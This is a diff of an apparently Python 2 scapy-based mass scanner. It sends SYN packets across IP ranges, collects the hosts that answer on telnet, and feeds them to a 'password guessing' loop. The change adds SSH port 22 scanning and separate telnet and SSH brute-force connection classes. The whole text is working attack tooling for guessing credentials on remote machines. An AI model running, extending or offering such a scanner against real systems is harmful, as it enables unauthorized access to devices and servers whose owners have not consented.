@@ -120,21 +120,21 @@ def cook(pkt):
         global lastRecv
         lastRecv = time.time()
         if pkt[TCP].flags == 18 and pkt[IP].src not in ip_prompt_queue:
-            queue.put(pkt[IP].src)
-            print "23 port opened: %s " % (pkt[IP].src)
+            queue.put((pkt[IP].src,pkt[TCP].sport))
+            print "%d port opened: %s " % (pkt[TCP].sport,pkt[IP].src)
             #print pkt[IP].dst
             ip_prompt_queue.append(pkt[IP].src)
     except:
         pass
 
 class sniffer(threading.Thread):
-    '''receive sport=22 package'''
+    '''receive sport=22/23 package'''
     def __init_(self):
         threading.Thread.__init__(self)
 
     def run(self):
         print "Start to sniffing..."
-        sniff(filter="tcp and dst port 2222 and src port 23",prn=cook)
+        sniff(filter="tcp and dst port 2222 and src port 23 or src port 22",prn=cook)
 
 
 class spewer(threading.Thread):
@@ -146,7 +146,7 @@ class spewer(threading.Thread):
     def run(self):
         global exitFlag
         print "Start to spewing..."
-        pkt = IP()/TCP(sport=2222,dport=[23],flags="S")
+        pkt = IP()/TCP(sport=2222,dport=[23,22],flags="S")
         for pair in self.ip_pair:
             for ip in pair:
                 pkt[IP].dst = num2ip(ip)
@@ -190,11 +190,20 @@ class Scanner(threading.Thread):
                 continue
 
             #password guessing
-            con = Connection(copy.deepcopy(ip_port),copy.deepcopy(auth_queue))
-            while con._state:
-                con.run()
-            con.exit()
-            del con
+            if ip_port[1] == 23:
+                con = telnetConnection(copy.deepcopy(ip_port),copy.deepcopy(auth_queue))
+                while con._state:
+                    con.run()
+                con.exit()
+                del con
+            elif ip_port[1] == 22:
+                conn = sshConnection(copy.deepcopy(ip_port),copy.deepcopy(auth_queue))
+                while conn._state:
+                    conn.run()
+                conn.exit()
+                del conn
+            else:
+                print "Wrong port"
                 
 if __name__ == "__main__": 
     if len(sys.argv) != 2:
